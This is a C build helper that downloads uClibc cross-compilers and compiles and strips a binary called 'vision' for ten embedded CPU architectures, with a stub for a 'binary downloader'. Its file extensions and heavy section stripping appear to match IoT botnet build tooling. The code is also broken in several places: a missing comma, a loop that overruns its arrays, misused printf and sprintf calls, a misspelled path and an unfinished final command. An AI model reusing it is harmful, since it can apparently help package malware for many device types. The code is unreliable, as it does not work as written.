#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define BUFSIZE 1024

char *flags = "";
char *cc_wgets[] = {
    "https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2",
    "https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2",
    "http://landley.net/code/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2",
    "https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2",
    "https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2",
    "https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2",
    "https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2",
    "https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2",
    "https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2",
    "https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2"
};
char *cc_tar_files[] = {
    "cross-compiler-armv4l.tar.bz2",
    "cross-compiler-armv5l.tar.bz2"
    "cross-compiler-armv7l.tar.bz2",
    "cross-compiler-i586.tar.bz2",
    "cross-compiler-mips.tar.bz2",
    "cross-compiler-mipsel.tar.bz2",
    "cross-compiler-powerpc.tar.bz2",
    "cross-compiler-sparc.tar.bz2",
    "cross-compiler-m68k.tar.bz2",
    "cross-compiler-sh4.tar.bz2"
};
char *cc_type[] = {
    "armv4l",
    "armv5l",
    "armv7l",
    "i586",
    "mips",
    "mipsel",
    "powerpc",
    "sparc",
    "m68k",
    "sh4"
};

char *cc_bin_extension[] = {
    ".arm",
    ".arm5n",
    ".arm7",
    ".x86",
    ".mips",
    ".mpsl",
    ".ppc",
    ".spc",
    ".m68k",
    ".sh4"
};

int main(int argc, char *argv[]) {
    char buf[BUFSIZE];
    int i;
    system("mkdir release hex");
    while(1) {
        for(i = 0;i < 11;i++) {
            printf(buf, "[compiler] Downloading %s.\n", cc_tar_files[i]);
            sleep(1);
            sprintf(buf, "wget %s", cc_wgets[i]);
            system(buf);
            printf(buf, "[compiler] Extracting %s.\n");
            sprintf(buf, "tar -xf %s", cc_tar_files[i]);
            system(buf);
            printf("[compiler] Cross compiling and stripping the vision binary for the %s cpu architecture type.\n", cc_type[i]);
            sprintf(buf, "./cross-compiler-%s/bin/%s-gcc %s -o /root/release/vision%s %s", cc_type[i], cc_type[i], argv[1],cc_bin_extension, flags);
            system(buf);
            sprintf(buf, "./cross-compiler-%s/bin/%s-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr -o release/visionstripped%s release/vision%s", cc_type[i], cc_type[i], cc_bin_extension[i],cc_bin_extension[i]);
            system(buf);
            printf("[compiler] Compiling the binary downloader for the %s cpu arhitecture type.\n");
            sprintf(buf, "./cross-commpiler-%s/bin/%s-gcc ");
        }
        break;
    }
    return 0;
}